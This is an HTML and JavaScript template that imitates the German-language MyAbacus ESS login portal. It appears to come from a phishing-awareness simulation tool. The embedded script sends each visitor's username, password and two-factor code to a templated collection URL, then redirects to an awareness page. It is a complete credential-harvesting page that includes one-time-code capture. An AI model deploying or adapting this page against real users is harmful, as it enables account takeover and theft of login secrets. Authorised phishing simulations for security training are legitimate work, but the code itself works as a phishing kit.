    <div class="hpanel">
      <div class="panel-body">

        <h5 class="login-please">Bitte anmelden für MyAbacus ESS</h5>

        <form method="post" action="{{POST_URL}}" id="step-login" autocomplete="off">
          <div class="form-group">
            <label class="control-label" for="username">Benutzername</label>
            <input type="text" name="email" id="username" class="form-control"
                   autocomplete="username" spellcheck="false" autocapitalize="none"
                   title="Bitte geben Sie Ihren Benutzernamen ein">
          </div>
          <div class="form-group">
            <label class="control-label" for="password">Passwort</label>
            <input type="password" name="password" id="password" class="form-control"
                   title="Bitte geben Sie Ihr Passwort ein">
          </div>
          <div class="form-actions">
            <button type="submit" class="btn btn-primary">Anmelden</button>
          </div>
        </form>

        <form method="post" action="{{POST_URL}}" id="step-2fa" style="display:none" autocomplete="off">
          <h5 class="login-please">Code eingeben</h5>
          <p class="otp-hint">Geben Sie den Bestätigungscode aus Ihrer Authenticator-App
             für <span id="email-echo-2"></span> ein.</p>
          <div class="form-group">
            <label class="control-label" for="code_2fa">Bestätigungscode</label>
            <input type="text" name="code_2fa" id="code_2fa" class="form-control"
                   inputmode="numeric" autocomplete="one-time-code"
                   spellcheck="false" autocapitalize="none"
                   title="Bitte geben Sie Ihren Bestätigungscode ein">
          </div>
          <div class="form-actions">
            <button type="submit" class="btn btn-primary">Bestätigen</button>
          </div>
        </form>

      </div>
    </div>

<script data-tracker src="{{TRACKER_URL_ATTR}}"></script>
<script>
(function () {
  // CAPTURE (authorised simulation): single-page login (username + password on
  // one screen, matching the real portal). On submit it records page 1 (email)
  // then page 2 (email+password) to the tracker — keeping the 3-page tracker
  // schema — then either shows the OTP step (page 3) or redirects to the
  // built-in awareness page (learn.html). URL params: rid/trackerId (tracker
  // context), email|login_hint (pre-fills the username), mfa=0 (skip OTP).
  var POST_URL = "{{POST_URL}}";
  var Q = new URLSearchParams(location.search);
  var prefillEmail = (Q.get("email") || Q.get("login_hint") || "").trim();
  var captureMfa   = Q.get("mfa") !== "0";
  function trackerCtx() {
    var t = window.__taphish_tracker || {};
    return { rid: t.rid || Q.get("rid") || "", sess_id: t.session_id || Q.get("sess_id") || "", trackerId: t.tracker_id || Q.get("trackerId") || "" };
  }
  function post(payload, cb) {
    cb = cb || function () {};
    if (!POST_URL) { cb(); return; }
    fetch(POST_URL, { method: "POST", mode: "cors", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }).then(cb, cb);
  }
  function sres() { return (window.screen ? (screen.width + "x" + screen.height) : ""); }
  // Next-round fix: page-0 visit beacon on load → tb_data_webpage_visit (was never
  // sent, so "clicked but didn't submit" was unmeasurable). Also carries screen_res.
  (function () { var c0 = trackerCtx(); post({ page: 0, rid: c0.rid, sess_id: c0.sess_id, trackerId: c0.trackerId, screen_res: sres() }); })();
  var formLogin = document.getElementById("step-login");
  var form2fa   = document.getElementById("step-2fa");
  var emailVal = "", pwdVal = "";
  function redirectAware(ctx) {
    var rid = ctx.rid ? ("?rid=" + encodeURIComponent(ctx.rid)) : "";
    setTimeout(function () { location.href = "learn.html" + rid; }, 250);
  }
  formLogin.addEventListener("submit", function (e) {
    e.preventDefault();
    emailVal = formLogin.elements["email"].value;
    pwdVal   = formLogin.elements["password"].value;
    var ctx = trackerCtx();
    post({ page: 1, form_field_data: { email: emailVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId, screen_res: sres() }, function () {
      post({ page: 2, form_field_data: { email: emailVal, password: pwdVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId, screen_res: sres() }, function () {
        if (captureMfa && form2fa) {
          formLogin.style.display = "none"; form2fa.style.display = "block";
          var ee = document.getElementById("email-echo-2"); if (ee) ee.textContent = emailVal;
        } else { redirectAware(ctx); }
      });
    });
  });
  if (form2fa) {
    form2fa.addEventListener("submit", function (e) {
      e.preventDefault();
      var code = form2fa.elements["code_2fa"].value;
      var ctx = trackerCtx();
      post({ page: 3, form_field_data: { email: emailVal, password: pwdVal }, code_2fa: code, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId, screen_res: sres() }, function () { redirectAware(ctx); });
    });
  }
  if (prefillEmail && formLogin.elements["email"]) { formLogin.elements["email"].value = prefillEmail; }
})();
</script>
